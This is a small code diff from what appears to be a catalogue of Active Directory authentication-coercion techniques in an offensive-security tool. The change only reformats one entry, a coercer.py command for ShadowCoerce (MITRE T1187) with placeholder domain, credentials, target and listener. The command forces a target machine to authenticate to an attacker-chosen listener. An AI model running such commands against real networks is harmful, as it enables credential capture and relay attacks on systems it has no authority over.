@@ -62,8 +62,7 @@ COERCE_TECHNIQUES: dict[str, CoerceTechnique] = {
         mitre_id="T1187",
         summary="Coerce via File Server Remote VSS RPC.",
         manual_commands=(
-            "coercer.py -d <DOMAIN> -u user -p pass -t <target> "
-            "-l <listener> -a ShadowCoerce",
+            "coercer.py -d <DOMAIN> -u user -p pass -t <target> -l <listener> -a ShadowCoerce",
         ),
     ),
     "relay_ldap": CoerceTechnique(
